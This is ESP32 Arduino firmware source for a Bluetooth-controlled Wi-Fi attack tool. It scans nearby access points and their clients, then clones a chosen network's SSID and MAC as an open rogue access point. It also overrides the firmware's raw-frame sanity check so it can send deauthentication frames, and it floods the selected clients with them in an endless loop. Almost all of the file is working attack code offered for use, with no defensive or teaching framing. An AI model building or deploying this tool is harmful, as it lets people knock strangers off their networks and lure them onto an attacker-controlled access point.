#include <Arduino.h>
#include "esp_wifi.h"
#include "esp_mac.h"
#include <beaconFrame.h>
#include <apInfo.h>
#include <BLEControl.h>
#include "esp_event.h"
#include "esp_wifi_types.h"
#include <manageClients.h>
#include "nvs_flash.h"
#include "esp_netif.h"


/*
    TODO:
    https://stackoverflow.com/questions/21411851/how-to-send-data-over-a-raw-ethernet-socket-using-sendto-without-using-sockaddr
    https://www.man7.org/linux/man-pages/man7/ip.7.html

    https://github.com/risinek/esp32-wifi-penetration-tool/tree/master/components/wsl_bypasser

    Look into why correct AP name is no longer advertised when clearing nvs flash

    Move ble callback to outside the class, directly call stateConfig function
*/

//configure AP
int switchChan = 0;

const uint8_t BEACON = 128; //First byte in frame that determins beacon subtype

const long offsetSec = 3600;
int channel = 1;
unsigned long curTime = millis();
//Stage. 0 is scanning for beacons. 1 is scannign for clients
int currentMode = 0;

//Store info on scanned AP
APInfo apInfo;
//Setup BLE
BLETerm bleTerm;

//handle connected clients
ConnectedClients connectedClients;

//Wifi config variables
wifi_config_t configAP;
wifi_init_config_t config = WIFI_INIT_CONFIG_DEFAULT();

wifi_promiscuous_filter_t filter;
uint8_t deauthClients[50][6]; //Store client mac addresse
int numDeauthClients = 0;
int selectedApNum = -1; //If value is -1, an ap has not been selected
static EventGroupHandle_t apEventGroup; //handle ap events

static const uint8_t rawDeauthFrame[] = {
    0xc0, 0x00, //frame control 
    0x3a, 0x01, //duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //reciever address
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //transmitter address
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //bssid
    0xf0, 0xff, //sequence number 
    0x02, 0x00 //reason code (authentication no longer valid)
};


void sendMsg(char msg[]) {
    bleTerm.pTxCharacteristic->setValue(msg);
    bleTerm.pTxCharacteristic->notify();
    delay(10);
}


void sendMsg(const char *msg) {
    bleTerm.pTxCharacteristic->setValue(msg);
    bleTerm.pTxCharacteristic->notify();
    delay(10);
}


void parseBeacon(wifi_promiscuous_pkt_t *mgmtPacket, signed rssi, uint8_t channel) {

    /*
    128 stands for 10000000 in binary 
    1000 - first four digits are the frame subtype. In this case it is the beacon subtype
    00 - Middle numbers are the frame type.
    00 - Last two zeroes are the version. In this case, it means we are using 802.11

    */

    //Cast to class to more easily parse information
    BeaconFrame *beacon = (BeaconFrame*)mgmtPacket->payload;
    uint8_t *payload = beacon->getPayload();

    //Lenth of ssid tag
    uint8_t ssidLen = beacon->getSSIDLen();
    Serial.print("SSID len: ");
    Serial.println(ssidLen);
    
    if(sizeof(payload) > 0) {
        //Get necessary info from beacon
        uint8_t ssid[ssidLen];
        beacon->getSSID(ssid, ssidLen);
        uint8_t bssid[6];
        beacon->getBSSID(bssid, 6);
        
        Serial.println();
        //Store ssid, bssid, and rssi to spoof later
        if(apInfo.addAP(ssid, bssid, rssi, channel, ssidLen)) {
            sendMsg("Access Point Found.");
        }
    }
    Serial.println();
}


bool checkIfMulticast(uint8_t macAddr[]) {
    //Avoid mac addresses baing added as clients
    uint8_t multicast1[] = {0x01, 0x80, 0xC2};
    uint8_t multicast2[] = {0x01, 0x1B, 0x19};
    uint8_t multicast3[] = {0x01, 0x00, 0x5E};
    uint8_t multicast4[] = {0x33, 0x33};
    uint8_t multicast5[] = {0x01, 0x0C, 0xCD};
    uint8_t multicast6[] = {0x01, 0x00, 0x0C};
    uint8_t multicast7[] = {0xFF, 0xFF, 0xFF};

    if(memcmp(macAddr, multicast1, sizeof(multicast1)) == 0) {
        return true;
    }
    else if(memcmp(macAddr, multicast2, sizeof(multicast2)) == 0) {
        return true;
    }
    else if(memcmp(macAddr, multicast3, sizeof(multicast3)) == 0) {
        return true;
    }
    else if(memcmp(macAddr, multicast4, sizeof(multicast4)) == 0) {
        return true;
    }
    else if(memcmp(macAddr, multicast5, sizeof(multicast5)) == 0) {
        return true;
    }
    else if(memcmp(macAddr, multicast6, sizeof(multicast6)) == 0) {
        return true;
    }
    else if(memcmp(macAddr, multicast7, sizeof(multicast7)) == 0) {
        return true;
    }

    return false;
}


void scanForClient(wifi_promiscuous_pkt_t *mgmtPacket) {
    BeaconFrame *beacon = (BeaconFrame*)mgmtPacket->payload;
    uint8_t destAddr[6];
    uint8_t recvAddr[6];

    //Get send and recieve address from recieved frame
    beacon->getDestinationAddress(destAddr, 6);
    beacon->getSenderAddress(recvAddr, 6);

    //Check if frame is being sent by or to an existing ap. Only one should a position. This is the access point mac
    int posDestAddr = apInfo.checkExisting(destAddr);
    int posRecvAddr = apInfo.checkExisting(recvAddr);


    if(posDestAddr != -1) {
        uint8_t sendAddr[6];
        beacon->getSenderAddress(sendAddr, 6);
        if(apInfo.checkClientExist(sendAddr, posDestAddr) == 0 && !checkIfMulticast(sendAddr)) { //Check if client already exists and filter out multicast addresses
            Serial.println("Destination MAC exists");
            apInfo.addClient(sendAddr, posDestAddr); //Add to existing clients
        }
    }
    if(posRecvAddr != -1) {
        uint8_t clientAddr[6];
        beacon->getDestinationAddress(clientAddr, 6);
        if(apInfo.checkClientExist(clientAddr, posDestAddr) == 0 && !checkIfMulticast(clientAddr)) { //Check if client already exists and filter out multicast addresses
            Serial.println("Redvier MAC exists");
            apInfo.addClient(clientAddr, posRecvAddr); //Add to existing clients
        }
    }
}


void wifiCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    //Cast to promiscuous packet type
    wifi_promiscuous_pkt_t *mgmtPacket = (wifi_promiscuous_pkt_t*)buf;

    switch(type) {
        case WIFI_PKT_MGMT: 
            if(mgmtPacket->payload[0] == BEACON) {
                signed rssi = mgmtPacket->rx_ctrl.rssi;
                uint8_t channel = mgmtPacket->rx_ctrl.channel;
                Serial.println("Beacon");
                parseBeacon(mgmtPacket, rssi, channel);
            }
            break;
        case WIFI_PKT_CTRL:
            Serial.println("ctrl packet");
        case WIFI_PKT_DATA:
            //if(mgmtPacket->payload[0] != 200) {
            Serial.println("Data pkt");
            scanForClient(mgmtPacket);
            //}
            break;
    }
}

/*
    Make this function disable wifi if it is already enabled
    Have it take a parameter to set the packet filter
*/
//Config wifi, change packet filter type depending on which stage program is in
int configWifi() {
    int stage = 0;
    
    if(esp_wifi_init(&config) != ESP_OK) {
        return -1;
    }

    if(esp_wifi_set_mode(WIFI_MODE_AP) != ESP_OK) {
        return -1;
    }

    if(esp_wifi_set_promiscuous_rx_cb(wifiCallback) != ESP_OK) {
        return -1;
    }
    
    return 0;
}


void configurePromisc(int filterMask) {
    esp_wifi_set_promiscuous(false);

    switch(filterMask) {
        case 0:
            filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
            break;
        case 1:
            filter.filter_mask = WIFI_PROMIS_FILTER_MASK_CTRL | WIFI_PROMIS_FILTER_MASK_DATA;
            break;
    }
    esp_wifi_set_promiscuous_filter(&filter);
    if(esp_wifi_set_promiscuous(true) != ESP_OK) {
        while(1) {
            Serial.println("Unable to set to promiscuous");
            delay(500);
        }
    }
}


void ssidToString(uint8_t ssid[], char newSSID[], int len) {
    //static char *newSSID = (char*)ssid;
    memcpy(newSSID, (char*)ssid, 32);
    newSSID[len] = '\0';
}


void printSSIDWeb() {
    int num = apInfo.getNumAP();
    uint8_t **ssidList = apInfo.getSSID();

    sendMsg("---AP List---");
    int totalLen = apInfo.SSID_LEN;
    if(num > 0) {
        char apMsg[40];
        memset(apMsg, '\0', 40);
        for(int i = 0; i < num; i++) {
            //max length of ssid
            int ssidLen = apInfo.getSSIDLen(i);

            if(ssidLen != 0) {
                snprintf(apMsg, ssidLen+4, "%i. %s", i+1, (char*)ssidList[i]);
                Serial.printf("Sending: %s\n", apMsg);
                sendMsg(apMsg);
                memset(apMsg, '\0', 40);
            }  
        }
    }
    else {
        //char apMsg[] = "No Access Points Found.";
        sendMsg("No Access Points Found.");
    }
    
}


//Parse command to get ap number that was selected
void selectAP() {
    //flag should start on index 10
    char *cmd = bleTerm.getFullCommand();

    //Convert ascii to int value
    int apSelect = cmd[10] - '0';
    int i = 10;

    //If number is miltiple digits, combine into a single number
    while(isdigit(cmd[i+1]) != 0) {
        int a = cmd[i+1] - '0';
        apSelect = (apSelect *10) + a;
        i++;
    }

    //Subtract 1 so the value aligns with array value
    if(apSelect-1 >= 0) {
        selectedApNum = apSelect-1;
    }
    else {
        sendMsg("[Error] No access point selected.");
    }
}


void listClients() {
    int num = apInfo.getNumAP();
    uint8_t **ssidList = apInfo.getSSID();

    int selectedAP = 0;
    int clientCount = apInfo.getClientCount(selectedAP);
    uint8_t clientMac[6];

    char sendSSID[32];
    ssidToString(ssidList[selectedAP], sendSSID, apInfo.getSSIDLen(selectedAP));
    
    sendMsg("---Client List---");
    sendMsg(sendSSID);
    int i = 0;
    bool cont = true;

    char clientMsg[20];
    memset(clientMsg, '\0', 20);
    do {
        apInfo.getClient(clientMac, selectedAP, i);
        if(clientCount > 0) {
            snprintf(clientMsg, 20, "%i. %x:%x:%x:%x:%x:%x", 
            i+1, 
            clientMac[0], 
            clientMac[1], 
            clientMac[2], 
            clientMac[3], 
            clientMac[4], 
            clientMac[5]
            );
        }
        else {
            snprintf(clientMsg, 20, "No Clients Found.");
        }
        sendMsg(clientMsg);
        Serial.println(i);

        i++;
        //On last iteration, reset i to zero, and iterate through clients of the next AP
        if(i >= clientCount) {
            selectedAP++;
            clientCount = apInfo.getClientCount(selectedAP);
            i=0;
            
            if(selectedAP < num) {
                char send[32];
                ssidToString(ssidList[selectedAP], send, apInfo.getSSIDLen(selectedAP));
                sendMsg(send);
            }
            else if(selectedAP >= num) {
                cont = false;
            }
        }

        delay(100);
    } while(cont == true);
    
}


esp_netif_t *configAPSpoof(uint8_t ssid[], int ssidLen, uint8_t bssid[], int channel) {
    esp_netif_t *spoofAP = esp_netif_create_default_wifi_ap();

    Serial.println("Setting AP values");
    configAP.ap.channel = channel;
    configAP.ap.max_connection = 2;
    configAP.ap.authmode = WIFI_AUTH_OPEN;
    configAP.ap.beacon_interval = 50; //Advertise more often than other ap

    Serial.printf("Copying ssid %s\n", ssid);
    memcpy(configAP.ap.ssid, ssid, 32);
    configAP.ap.ssid_len = ssidLen;
    Serial.println("Initializing config");
    esp_wifi_set_config(WIFI_IF_AP, &configAP);
    esp_wifi_set_mac(WIFI_IF_AP, bssid);

    return spoofAP;
}


void selectDeauthClients() {
    //command should start on 15
    char *cmd = bleTerm.getFullCommand();
    int userCommandLength = bleTerm.getCommandLength();
    int maxCmdLen = 100;
    int startPoint = 14;
    int numClients = apInfo.getClientCount(selectedApNum);

    //If flags do no start at index 15, find the starting point
    if(cmd[startPoint] != ' ') {
        Serial.println("Incorrect format");
        startPoint = 0;

        //loop until the space seperating cmd and flags is found
        while(cmd[startPoint] != ' ') {
            startPoint++;
        }
        
        Serial.printf("New starting point: %i\n", startPoint);
    }
    startPoint++;

    for(int i = startPoint; i < userCommandLength-1; i++) {
        if(cmd[i] == ',' && i+1 < userCommandLength) {
            i++;
        }

        int a = cmd[i] - 49;
        while(isdigit(cmd[i+1]) != 0) {
            int b = cmd[i+1] - '0';
            a = (a *10) + b;
            i++;
        }

        if(a < numClients) {
            Serial.printf("Copying client number %i to deauth array\n", a);
            apInfo.getClient(deauthClients[numDeauthClients], selectedApNum, a);
            numDeauthClients++;
        }
    }
}


void selectAllDeauthClients() {
    numDeauthClients = apInfo.getClientCount(selectedApNum);

    Serial.println("Selecting all clients");
    for(int i = 0; i < numDeauthClients; i++) {
        apInfo.getClient(deauthClients[numDeauthClients], selectedApNum, i);
    }
}

void ap_event_cb(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    Serial.println("AP cb called");
    if(event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STACONNECTED) {
        Serial.println("AP_CONNETed event");
        wifi_event_ap_staconnected_t *event = (wifi_event_ap_staconnected_t*) event_data;
        char message[50];
        connectedClients.addClient(event->mac);
        //snprintf(message, 50, "Station %s Connected.\n", MAC2STR(event->mac));
        snprintf(message, 50, "Station %x:%x:%x:%x:%x:%x Connected.\n", event->mac[0], 
                                                                            event->mac[1],
                                                                            event->mac[2],
                                                                            event->mac[3],
                                                                            event->mac[4],
                                                                            event->mac[5]
                                                                            );
        sendMsg(message);
    }
    else if(event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STADISCONNECTED) {
        Serial.println("AP_disCONNETed event");
        wifi_event_ap_stadisconnected_t *event = (wifi_event_ap_stadisconnected_t*) event_data;
        char message[50];
        connectedClients.removeClient(event->mac);
        snprintf(message, 50, "Station %x:%x:%x:%x:%x:%x Disconnected.\n", event->mac[0], 
                                                                            event->mac[1],
                                                                            event->mac[2],
                                                                            event->mac[3],
                                                                            event->mac[4],
                                                                            event->mac[5]
                                                                            );
        sendMsg(message);
        //sendMsg("Disconnect Eevnt");
    }
    else {
        Serial.println(event_id);
    }
}


//bypass sanity check that prevents deauth frames from being transmitted
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}

static void wifi_event_handler(void *arg, esp_event_base_t event_base,
                               int32_t event_id, void *event_data) {
                                Serial.println("Delete me");
                               }


void startAPSpoof(esp_netif_t *ap_interface) {
    //Make sure device is no longer scanning
    esp_wifi_set_promiscuous(false);
    esp_event_loop_create_default();
    apEventGroup = xEventGroupCreate();

    esp_event_handler_instance_register(
        WIFI_EVENT,
        ESP_EVENT_ANY_ID,
        &ap_event_cb,
        NULL,
        NULL
        );

    esp_wifi_start();

    int frameSize = sizeof(rawDeauthFrame);
    uint8_t deauthFrame[frameSize];
    
    uint8_t currentMac[6];

    esp_wifi_get_mac(WIFI_IF_AP, currentMac);
    memcpy(deauthFrame, rawDeauthFrame, frameSize);
    //Set mac and bssid in frame
    memcpy(&deauthFrame[10], currentMac, 6);
    memcpy(&deauthFrame[16], currentMac, 6);
    int clientCount = apInfo.getClientCount(selectedApNum);

    Serial.println("Startung deauth test");
    while(true) {
        for(int i = 0; i < numDeauthClients; i++) {
            if(!connectedClients.checkIfClientExists(deauthClients[i])) { //check if clients exists before deauthing
                memcpy(&deauthFrame[4], deauthClients[i], 6);
                esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, frameSize, false);
            }
            delay(10);

            if(i == clientCount-1) {
                i = -1;
            }
        }
    }
}


void setup()
{
    //prevent esp from advertising previously spoofed ap
    //nvs_flash_erase();
    //nvs_flash_init();

    esp_netif_init();

    Serial.begin(115200);
    //Serup wifi access point
    Serial.println("Setting up Config Access Point");

    Serial.println("Configuring Wifi");
    if(configWifi() == -1) {
        while(true) {
            Serial.println("Unable to initialize wifi");
            delay(1000);
        }
    }

    if(esp_wifi_start() != ESP_OK) {
        while(1) {
            Serial.println("Unable to start wifi");
            delay(500);
        }
    }
    Serial.println("Starting bluetooth");
    setupBLE(bleTerm);
}


void configState() {
    int cmd = bleTerm.getCommand();
    //Serial.printf("Command: %i\n", cmd);
    if(cmd != -1) {
        switch(cmd) {
            case 0: { //help
                sendMsg("Placeholder Help Message");
                break;
            }
            case 1: { //scan-ap
                configurePromisc(0); //init scan for AP
                sendMsg("Starting AP Scan");
                switchChan = 1;
                break;
            }
            case 2: { //scan-stop
                sendMsg("Stopping Scan");
                esp_wifi_set_promiscuous(false); //stop ap scan
                switchChan = 0;
                break;
            }
            case 3: { //scan-client
                sendMsg("Staring Client Scan");
                configurePromisc(1); //start client scan
                switchChan = 2;
                channel = 0;
                break;
            }
            case 4: { //list ap
                sendMsg("Listing AP");
                printSSIDWeb(); //print access points
                break;
            }
            case 5: { //list-clients
                sendMsg("Listing Clients");
                listClients();
                break;
            }
            case 6: { //select-ap
                //array containing all ssid
                uint8_t **ssidList = apInfo.getSSID();
                char charSSID[32];
                selectAP();

                if(selectedApNum >= 0) {
                    int ssidLen = apInfo.getSSIDLen(selectedApNum);

                    ssidToString(ssidList[selectedApNum], charSSID, ssidLen);
                    Serial.print("Cur num: ");
                    Serial.println(selectedApNum);
                    if(selectedApNum < apInfo.getNumAP()) {
                        
                        char msg[50];
                        snprintf(msg, 50, "AP '%s' Selected.", charSSID);
                        sendMsg(msg);
                        
                        //Store info to spoof ap
                        //configAPSpoof(ssidList[selectedApNum], apInfo.getSSIDLen(selectedApNum), bssid, apInfo.getChannel(selectedApNum));
                    }   
                    else {
                        selectedApNum = -1;
                        sendMsg("Selected AP does not exist");
                    }
                }
                break;
            }
            case 7: { //select client
                if(selectedApNum != -1) {
                    sendMsg("Adding selected clients");
                    selectDeauthClients();
                }
                else {
                    sendMsg("[Error] An access point must be selected");
                }
                break;
            }
            case 8: { //select all clients
                if(selectedApNum != -1) {
                    sendMsg("Selecting all clients");
                    selectAllDeauthClients();
                }
                else {
                    sendMsg("[Error] An access point must be selected");
                }
                break;
            }
            case 9: { //start attack
                uint8_t **ssidList = apInfo.getSSID();
                uint8_t *bssid = apInfo.getBSSID(selectedApNum);
                if(selectedApNum != -1 && numDeauthClients > 0) {
                    esp_netif_t *ap_interface = configAPSpoof(ssidList[selectedApNum], apInfo.getSSIDLen(selectedApNum), bssid, apInfo.getChannel(selectedApNum));

                    sendMsg("Starting attack");
                    startAPSpoof(ap_interface);
                }
                else if(selectedApNum == -1) {
                    sendMsg("[Error] An an access point must be selected");
                }
                else if(numDeauthClients == 0) {
                    sendMsg("No clients selected. Defaulting to all.");
                    selectAllDeauthClients();
                    esp_netif_t *ap_interface = configAPSpoof(ssidList[selectedApNum], apInfo.getSSIDLen(selectedApNum), bssid, apInfo.getChannel(selectedApNum));
                    startAPSpoof(ap_interface);
                }
                break;
            }
            case 10: {
#ifdef SSID
                //connectToWifi();
#endif
                break;
            }
            default: {
                sendMsg("[Error] Command Not Found");
            }
        }
        bleTerm.resetCommand();
    }
}

void loop()
{
    int curChannel = channel;

    configState();

    switch(switchChan) {
        case 1: //Scan for ap on all channels
            if(millis() - curTime > 100) {
                if(channel <= 11) {
                    channel++;
                    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
                }
                else {
                    channel = 1;
                    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
                }
                curTime = millis();
            }
        
            if(curChannel != channel) {
                Serial.printf("Current Channel: %i\n", channel);
            }
            break;
        case 2: //Scan for clients only on channels ap's have been discovered on
            int apNum = apInfo.getNumAP();

            if(millis() - curTime > 500) {
                if(channel < apNum) {
                    int scanApChannel = apInfo.getChannel(channel);
                    esp_wifi_set_channel(scanApChannel, WIFI_SECOND_CHAN_NONE);
                    channel++;
                    Serial.printf("Current Channel: %i\n", scanApChannel);
                }
                else {
                    channel = 0;
                    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
                }
                curTime = millis();
            }
    }
    delay(500);
}